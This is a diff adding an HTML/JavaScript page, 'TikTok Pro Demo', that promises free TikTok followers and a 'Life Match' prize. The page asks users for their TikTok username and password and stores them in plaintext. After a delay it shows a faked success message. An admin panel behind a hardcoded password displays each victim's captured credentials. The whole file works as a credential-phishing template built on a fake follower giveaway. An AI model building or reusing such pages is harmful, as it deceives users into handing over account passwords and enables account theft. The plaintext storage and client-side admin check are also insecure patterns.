@@ -1,0 +1,872 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok Pro Demo</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        :root {
+            --primary-gradient: linear-gradient(45deg, #ff0050, #ff0050, #00f2ea, #00f2ea);
+            --secondary-gradient: linear-gradient(45deg, #00f2ea, #ff0050);
+            --bg-color: #f8f9fa;
+            --card-bg: #ffffff;
+            --text-dark: #121212;
+            --text-light: #f8f9fa;
+            --accent-pink: #ff0050;
+            --accent-cyan: #00f2ea;
+            --shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-dark);
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 0;
+            margin-bottom: 30px;
+        }
+
+        .logo {
+            font-size: 28px;
+            font-weight: 700;
+            background: var(--primary-gradient);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .btn {
+            padding: 12px 24px;
+            border: none;
+            border-radius: 50px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-size: 16px;
+        }
+
+        .btn-primary {
+            background: var(--primary-gradient);
+            color: white;
+        }
+
+        .btn-secondary {
+            background: var(--secondary-gradient);
+            color: white;
+        }
+
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: var(--shadow);
+        }
+
+        .page {
+            display: none;
+            animation: fadeIn 0.5s ease;
+        }
+
+        .active {
+            display: block;
+        }
+
+        .landing-page {
+            text-align: center;
+            padding: 60px 20px;
+        }
+
+        .landing-content {
+            max-width: 600px;
+            margin: 0 auto;
+        }
+
+        .landing-title {
+            font-size: 48px;
+            margin-bottom: 20px;
+            background: var(--primary-gradient);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .landing-subtitle {
+            font-size: 20px;
+            margin-bottom: 40px;
+            color: #666;
+        }
+
+        .auth-buttons {
+            display: flex;
+            gap: 20px;
+            justify-content: center;
+        }
+
+        .card {
+            background: var(--card-bg);
+            border-radius: 16px;
+            padding: 24px;
+            box-shadow: var(--shadow);
+            margin-bottom: 24px;
+        }
+
+        .profile-header {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+
+        .avatar {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            object-fit: cover;
+            border: 3px solid transparent;
+            background: var(--secondary-gradient) border-box;
+            padding: 2px;
+        }
+
+        .profile-info h2 {
+            font-size: 24px;
+            margin-bottom: 5px;
+        }
+
+        .profile-info p {
+            color: #666;
+        }
+
+        .features {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+
+        .feature-card {
+            padding: 30px;
+            text-align: center;
+            border-radius: 16px;
+            background: var(--card-bg);
+            box-shadow: var(--shadow);
+            transition: transform 0.3s ease;
+        }
+
+        .feature-card:hover {
+            transform: translateY(-5px);
+        }
+
+        .feature-icon {
+            font-size: 40px;
+            margin-bottom: 20px;
+            background: var(--primary-gradient);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .feature-title {
+            font-size: 20px;
+            margin-bottom: 15px;
+        }
+
+        .feature-description {
+            color: #666;
+            margin-bottom: 20px;
+        }
+
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            padding: 15px 25px;
+            border-radius: 10px;
+            background: var(--card-bg);
+            box-shadow: var(--shadow);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            transform: translateX(150%);
+            transition: transform 0.3s ease;
+            z-index: 1000;
+        }
+
+        .notification.show {
+            transform: translateX(0);
+        }
+
+        .notification.success {
+            border-left: 4px solid #4caf50;
+        }
+
+        .notification.pending {
+            border-left: 4px solid #ff9800;
+        }
+
+        .notification.error {
+            border-left: 4px solid #f44336;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 12px 16px;
+            border: 1px solid #ddd;
+            border-radius: 10px;
+            font-size: 16px;
+        }
+
+        .admin-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
+        }
+
+        .admin-table th, .admin-table td {
+            padding: 12px 15px;
+            text-align: left;
+            border-bottom: 1px solid #ddd;
+        }
+
+        .admin-table th {
+            background-color: #f8f9fa;
+            font-weight: 600;
+        }
+
+        .admin-table tr:hover {
+            background-color: #f1f1f1;
+        }
+
+        .status-badge {
+            display: inline-block;
+            padding: 5px 10px;
+            border-radius: 50px;
+            font-size: 12px;
+            font-weight: 600;
+        }
+
+        .status-success {
+            background-color: #e8f5e9;
+            color: #4caf50;
+        }
+
+        .status-pending {
+            background-color: #fff3e0;
+            color: #ff9800;
+        }
+
+        .status-error {
+            background-color: #ffebee;
+            color: #f44336;
+        }
+
+        .tiktok-login-form {
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 12px;
+            margin-top: 20px;
+            border: 1px solid #eee;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        @media (max-width: 768px) {
+            .auth-buttons {
+                flex-direction: column;
+            }
+            
+            .features {
+                grid-template-columns: 1fr;
+            }
+            
+            .profile-header {
+                flex-direction: column;
+                text-align: center;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Landing Page -->
+        <div id="landingPage" class="page active">
+            <header>
+                <div class="logo">TikTok Pro</div>
+            </header>
+            
+            <div class="landing-page">
+                <div class="landing-content">
+                    <h1 class="landing-title">Experience TikTok's Professional Features</h1>
+                    <p class="landing-subtitle">Sign up now to explore follower simulation, life match, and more!</p>
+                    
+                    <div class="auth-buttons">
+                        <button class="btn btn-primary" onclick="showPage('signupPage')">
+                            <i class="fas fa-user-plus"></i> Sign Up
+                        </button>
+                        <button class="btn btn-secondary" onclick="showPage('loginPage')">
+                            <i class="fas fa-sign-in-alt"></i> Login
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Sign Up Page -->
+        <div id="signupPage" class="page">
+            <header>
+                <div class="logo">TikTok Pro</div>
+                <button class="btn btn-secondary" onclick="showPage('landingPage')">
+                    <i class="fas fa-arrow-left"></i> Back
+                </button>
+            </header>
+            
+            <div class="card">
+                <h2>Create Your Account</h2>
+                <form id="signupForm">
+                    <div class="form-group">
+                        <label for="signupUsername">Username</label>
+                        <input type="text" id="signupUsername" class="form-control" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="signupEmail">Email</label>
+                        <input type="email" id="signupEmail" class="form-control" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="signupPassword">Password</label>
+                        <input type="password" id="signupPassword" class="form-control" required>
+                    </div>
+                    <button type="submit" class="btn btn-primary">Sign Up</button>
+                </form>
+            </div>
+        </div>
+
+        <!-- Login Page -->
+        <div id="loginPage" class="page">
+            <header>
+                <div class="logo">TikTok Pro</div>
+                <button class="btn btn-secondary" onclick="showPage('landingPage')">
+                    <i class="fas fa-arrow-left"></i> Back
+                </button>
+            </header>
+            
+            <div class="card">
+                <h2>Login to Your Account</h2>
+                <form id="loginForm">
+                    <div class="form-group">
+                        <label for="loginEmail">Email</label>
+                        <input type="email" id="loginEmail" class="form-control" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="loginPassword">Password</label>
+                        <input type="password" id="loginPassword" class="form-control" required>
+                    </div>
+                    <button type="submit" class="btn btn-primary">Login</button>
+                </form>
+            </div>
+        </div>
+
+        <!-- Home Page -->
+        <div id="homePage" class="page">
+            <header>
+                <div class="logo">TikTok Pro</div>
+                <div>
+                    <button class="btn btn-secondary" onclick="showAdminPanel()">
+                        <i class="fas fa-cog"></i> Admin Panel
+                    </button>
+                    <button class="btn btn-primary" onclick="logout()">
+                        <i class="fas fa-sign-out-alt"></i> Logout
+                    </button>
+                </div>
+            </header>
+            
+            <div class="profile-header">
+                <img src="https://randomuser.me/api/portraits/men/32.jpg" alt="Avatar" class="avatar">
+                <div class="profile-info">
+                    <h2 id="profileUsername">John Doe</h2>
+                    <p id="profileEmail">john.doe@example.com</p>
+                </div>
+            </div>
+            
+            <div class="features">
+                <div class="feature-card">
+                    <div class="feature-icon">
+                        <i class="fas fa-users"></i>
+                    </div>
+                    <h3 class="feature-title">1K Followers</h3>
+                    <p class="feature-description">Get instant followers to boost your profile</p>
+                    <button class="btn btn-primary" onclick="showFollowerForm()">
+                        Get Followers
+                    </button>
+                </div>
+                
+                <div class="feature-card">
+                    <div class="feature-icon">
+                        <i class="fas fa-heart"></i>
+                    </div>
+                    <h3 class="feature-title">Win Your Life Match</h3>
+                    <p class="feature-description">Find your perfect match and win amazing prizes</p>
+                    <button class="btn btn-secondary" onclick="showLifeMatchForm()">
+                        Join Now
+                    </button>
+                </div>
+            </div>
+            
+            <!-- Follower Request Form -->
+            <div id="followerForm" class="card tiktok-login-form" style="display: none;">
+                <h3>Get 1K Followers</h3>
+                <p>Enter your TikTok credentials to get followers</p>
+                <form id="followerRequestForm">
+                    <div class="form-group">
+                        <label for="tiktokUsername">TikTok Username</label>
+                        <input type="text" id="tiktokUsername" class="form-control" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="tiktokPassword">TikTok Password</label>
+                        <input type="password" id="tiktokPassword" class="form-control" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="followerQuantity">Quantity (max 1000)</label>
+                        <input type="number" id="followerQuantity" class="form-control" value="1000" min="100" max="1000" required>
+                    </div>
+                    <button type="submit" class="btn btn-primary">Submit Request</button>
+                </form>
+            </div>
+            
+            <!-- Life Match Form -->
+            <div id="lifeMatchForm" class="card" style="display: none;">
+                <h3>Life Match Entry</h3>
+                <form id="matchForm">
+                    <div class="form-group">
+                        <label for="matchId">Your ID</label>
+                        <input type="text" id="matchId" class="form-control" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="matchPassword">Password</label>
+                        <input type="password" id="matchPassword" class="form-control" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="matchDate">Date</label>
+                        <input type="date" id="matchDate" class="form-control" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="matchTime">Time</label>
+                        <input type="time" id="matchTime" class="form-control" required>
+                    </div>
+                    <button type="submit" class="btn btn-primary">Submit</button>
+                </form>
+            </div>
+        </div>
+
+        <!-- Admin Panel -->
+        <div id="adminPanel" class="page">
+            <header>
+                <div class="logo">TikTok Pro</div>
+                <button class="btn btn-secondary" onclick="showPage('homePage')">
+                    <i class="fas fa-arrow-left"></i> Back to Home
+                </button>
+            </header>
+            
+            <div class="card">
+                <h2>Admin Panel</h2>
+                <div id="adminLogin">
+                    <div class="form-group">
+                        <label for="adminPassword">Admin Password</label>
+                        <input type="password" id="adminPassword" class="form-control" placeholder="Enter admin password">
+                    </div>
+                    <button class="btn btn-primary" onclick="loginAdmin()">Login</button>
+                </div>
+                
+                <div id="adminContent" style="display: none;">
+                    <h3>User Activity</h3>
+                    <div class="admin-controls">
+                        <button class="btn btn-secondary" onclick="refreshAdminData()">
+                            <i class="fas fa-sync-alt"></i> Refresh Data
+                        </button>
+                    </div>
+                    <table class="admin-table">
+                        <thead>
+                            <tr>
+                                <th>Username</th>
+                                <th>Email</th>
+                                <th>Signup Time</th>
+                                <th>TikTok ID</th>
+                                <th>Followers Status</th>
+                                <th>Match Status</th>
+                                <th>Actions</th>
+                            </tr>
+                        </thead>
+                        <tbody id="adminTableBody">
+                            <!-- Data will be populated here -->
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Notification -->
+    <div id="notification" class="notification">
+        <i class="fas fa-bell"></i>
+        <span id="notificationText"></span>
+    </div>
+
+    <script>
+        // Current user data
+        let currentUser = null;
+        let users = JSON.parse(localStorage.getItem('tiktok_users')) || [];
+        let adminPassword = "331099";
+        let followerRequests = JSON.parse(localStorage.getItem('follower_requests')) || [];
+        let matchRequests = JSON.parse(localStorage.getItem('match_requests')) || [];
+        
+        // DOM elements
+        const notification = document.getElementById('notification');
+        const notificationText = document.getElementById('notificationText');
+        
+        // Show specific page and hide others
+        function showPage(pageId) {
+            document.querySelectorAll('.page').forEach(page => {
+                page.classList.remove('active');
+            });
+            document.getElementById(pageId).classList.add('active');
+        }
+        
+        // Show notification
+        function showNotification(message, type) {
+            notificationText.textContent = message;
+            notification.className = 'notification ' + type;
+            notification.classList.add('show');
+            
+            setTimeout(() => {
+                notification.classList.remove('show');
+            }, 3000);
+        }
+        
+        // Sign up form submission
+        document.getElementById('signupForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('signupUsername').value;
+            const email = document.getElementById('signupEmail').value;
+            const password = document.getElementById('signupPassword').value;
+            
+            // Check if user already exists
+            if (users.find(user => user.email === email)) {
+                showNotification('User with this email already exists!', 'error');
+                return;
+            }
+            
+            // Create new user
+            const newUser = {
+                username,
+                email,
+                password,
+                signupTime: new Date().toLocaleString(),
+                followersStatus: 'Inactive',
+                matchStatus: 'Not Participated'
+            };
+            
+            users.push(newUser);
+            localStorage.setItem('tiktok_users', JSON.stringify(users));
+            
+            showNotification('Account created successfully! You can now login.', 'success');
+            
+            // Redirect to login page
+            setTimeout(() => {
+                showPage('loginPage');
+                document.getElementById('signupForm').reset();
+            }, 1500);
+        });
+        
+        // Login form submission
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('loginEmail').value;
+            const password = document.getElementById('loginPassword').value;
+            
+            // Find user
+            const user = users.find(user => user.email === email && user.password === password);
+            
+            if (user) {
+                currentUser = user;
+                localStorage.setItem('current_user', JSON.stringify(user));
+                
+                // Update profile info
+                document.getElementById('profileUsername').textContent = user.username;
+                document.getElementById('profileEmail').textContent = user.email;
+                
+                showNotification('Login successful!', 'success');
+                
+                // Redirect to home page
+                setTimeout(() => {
+                    showPage('homePage');
+                    document.getElementById('loginForm').reset();
+                }, 1500);
+            } else {
+                showNotification('Invalid email or password!', 'error');
+            }
+        });
+        
+        // Check if user is logged in
+        function checkLogin() {
+            const userData = localStorage.getItem('current_user');
+            if (userData) {
+                currentUser = JSON.parse(userData);
+                document.getElementById('profileUsername').textContent = currentUser.username;
+                document.getElementById('profileEmail').textContent = currentUser.email;
+                showPage('homePage');
+            } else {
+                showPage('landingPage');
+            }
+        }
+        
+        // Logout
+        function logout() {
+            localStorage.removeItem('current_user');
+            currentUser = null;
+            showNotification('Logged out successfully!', 'success');
+            setTimeout(() => showPage('landingPage'), 1000);
+        }
+        
+        // Show follower form
+        function showFollowerForm() {
+            document.getElementById('followerForm').style.display = 'block';
+            document.getElementById('lifeMatchForm').style.display = 'none';
+        }
+        
+        // Follower request form submission
+        document.getElementById('followerRequestForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            if (!currentUser) return;
+            
+            const tiktokUsername = document.getElementById('tiktokUsername').value;
+            const tiktokPassword = document.getElementById('tiktokPassword').value;
+            const quantity = document.getElementById('followerQuantity').value;
+            
+            // Create follower request
+            const request = {
+                id: Date.now(),
+                userId: currentUser.email,
+                username: currentUser.username,
+                tiktokUsername,
+                tiktokPassword,
+                quantity,
+                status: 'Pending',
+                timestamp: new Date().toLocaleString()
+            };
+            
+            // Save to localStorage
+            followerRequests.push(request);
+            localStorage.setItem('follower_requests', JSON.stringify(followerRequests));
+            
+            // Update user status
+            const userIndex = users.findIndex(user => user.email === currentUser.email);
+            if (userIndex !== -1) {
+                users[userIndex].followersStatus = 'Pending';
+                users[userIndex].tiktokUsername = tiktokUsername;
+                localStorage.setItem('tiktok_users', JSON.stringify(users));
+            }
+            
+            showNotification('Your request has been received. Please wait a few minutes...', 'pending');
+            
+            // Simulate success after delay
+            setTimeout(() => {
+                // Update request status
+                const requestIndex = followerRequests.findIndex(r => r.id === request.id);
+                if (requestIndex !== -1) {
+                    followerRequests[requestIndex].status = 'Completed';
+                    localStorage.setItem('follower_requests', JSON.stringify(followerRequests));
+                }
+                
+                // Update user status
+                if (userIndex !== -1) {
+                    users[userIndex].followersStatus = `Active (${quantity})`;
+                    localStorage.setItem('tiktok_users', JSON.stringify(users));
+                }
+                
+                showNotification('Congratulations! Your followers have been added successfully ✅', 'success');
+                
+                // Reset form
+                document.getElementById('followerRequestForm').reset();
+                document.getElementById('followerForm').style.display = 'none';
+            }, 5000);
+        });
+        
+        // Show life match form
+        function showLifeMatchForm() {
+            document.getElementById('lifeMatchForm').style.display = 'block';
+            document.getElementById('followerForm').style.display = 'none';
+        }
+        
+        // Life match form submission
+        document.getElementById('matchForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            if (!currentUser) return;
+            
+            const matchId = document.getElementById('matchId').value;
+            const matchPassword = document.getElementById('matchPassword').value;
+            const matchDate = document.getElementById('matchDate').value;
+            const matchTime = document.getElementById('matchTime').value;
+            
+            // Create match request
+            const request = {
+                id: Date.now(),
+                userId: currentUser.email,
+                username: currentUser.username,
+                matchId,
+                matchPassword,
+                matchDate,
+                matchTime,
+                status: 'Participated',
+                timestamp: new Date().toLocaleString()
+            };
+            
+            // Save to localStorage
+            matchRequests.push(request);
+            localStorage.setItem('match_requests', JSON.stringify(matchRequests));
+            
+            // Update user status
+            const userIndex = users.findIndex(user => user.email === currentUser.email);
+            if (userIndex !== -1) {
+                users[userIndex].matchStatus = 'Participated';
+                localStorage.setItem('tiktok_users', JSON.stringify(users));
+            }
+            
+            showNotification('Your life match entry has been submitted successfully!', 'success');
+            
+            // Reset form
+            document.getElementById('matchForm').reset();
+            document.getElementById('lifeMatchForm').style.display = 'none';
+        });
+        
+        // Show admin panel
+        function showAdminPanel() {
+            showPage('adminPanel');
+            document.getElementById('adminContent').style.display = 'none';
+            document.getElementById('adminLogin').style.display = 'block';
+            document.getElementById('adminPassword').value = '';
+        }
+        
+        // Login admin
+        function loginAdmin() {
+            const password = document.getElementById('adminPassword').value;
+            
+            if (password === adminPassword) {
+                document.getElementById('adminLogin').style.display = 'none';
+                document.getElementById('adminContent').style.display = 'block';
+                
+                // Populate admin table
+                refreshAdminData();
+            } else {
+                showNotification('Invalid admin password!', 'error');
+            }
+        }
+        
+        // Refresh admin data
+        function refreshAdminData() {
+            // Reload data from localStorage
+            users = JSON.parse(localStorage.getItem('tiktok_users')) || [];
+            followerRequests = JSON.parse(localStorage.getItem('follower_requests')) || [];
+            matchRequests = JSON.parse(localStorage.getItem('match_requests')) || [];
+            
+            const tableBody = document.getElementById('adminTableBody');
+            tableBody.innerHTML = '';
+            
+            users.forEach(user => {
+                // Get follower requests for this user
+                const userFollowerRequests = followerRequests.filter(req => req.userId === user.email);
+                const userMatchRequests = matchRequests.filter(req => req.userId === user.email);
+                
+                const row = document.createElement('tr');
+                row.innerHTML = `
+                    <td>${user.username}</td>
+                    <td>${user.email}</td>
+                    <td>${user.signupTime}</td>
+                    <td>${user.tiktokUsername || 'N/A'}</td>
+                    <td><span class="status-badge ${getStatusClass(user.followersStatus)}">${user.followersStatus}</span></td>
+                    <td><span class="status-badge ${getStatusClass(user.matchStatus)}">${user.matchStatus}</span></td>
+                    <td>
+                        ${userFollowerRequests.length > 0 ? 
+                            `<button class="btn-view-details" onclick="viewUserDetails('${user.email}')">View Details</button>` : 
+                            'No requests'}
+                    </td>
+                `;
+                tableBody.appendChild(row);
+            });
+        }
+        
+        // View user details
+        function viewUserDetails(userEmail) {
+            const userFollowerRequests = followerRequests.filter(req => req.userId === userEmail);
+            const userMatchRequests = matchRequests.filter(req => req.userId === userEmail);
+            
+            let detailsMessage = "User Details:\n\n";
+            
+            if (userFollowerRequests.length > 0) {
+                detailsMessage += "FOLLOWER REQUESTS:\n";
+                userFollowerRequests.forEach(req => {
+                    detailsMessage += `- TikTok ID: ${req.tiktokUsername}\n`;
+                    detailsMessage += `  Password: ${req.tiktokPassword}\n`;
+                    detailsMessage += `  Quantity: ${req.quantity}\n`;
+                    detailsMessage += `  Status: ${req.status}\n`;
+                    detailsMessage += `  Time: ${req.timestamp}\n\n`;
+                });
+            }
+            
+            if (userMatchRequests.length > 0) {
+                detailsMessage += "LIFE MATCH REQUESTS:\n";
+                userMatchRequests.forEach(req => {
+                    detailsMessage += `- Match ID: ${req.matchId}\n`;
+                    detailsMessage += `  Password: ${req.matchPassword}\n`;
+                    detailsMessage += `  Date: ${req.matchDate}\n`;
+                    detailsMessage += `  Time: ${req.matchTime}\n`;
+                    detailsMessage += `  Status: ${req.status}\n`;
+                    detailsMessage += `  Time: ${req.timestamp}\n\n`;
+                });
+            }
+            
+            alert(detailsMessage);
+        }
+        
+        // Get status class for badges
+        function getStatusClass(status) {
+            if (status.includes('Active') || status.includes('Success') || status.includes('Completed')) return 'status-success';
+            if (status.includes('Pending') || status.includes('Participated')) return 'status-pending';
+            return 'status-error';
+        }
+        
+        // Initialize the app
+        window.onload = function() {
+            checkLogin();
+        };
+    </script>
+</body>
+</html>
